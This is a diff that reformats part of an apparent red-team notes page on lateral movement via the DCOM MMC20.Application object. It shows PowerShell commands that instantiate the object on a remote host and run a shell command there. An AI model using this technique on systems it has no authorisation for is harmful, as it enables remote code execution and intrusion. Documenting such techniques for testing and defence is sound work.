@@ -26,23 +26,19 @@ Get-ChildItem 'registry::HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{49B2791A-B1AE-4C90
 
 Establishing a connection to the victim host:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 $a = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","10.0.0.2"))
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Executing command on the victim system via DCOM object:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 $a.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c hostname > c:\fromdcom.txt","7")
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Below shows the command execution and the result of it - remote machine's `hostname` command output is written to `c:\fromdcom.txt`:
 
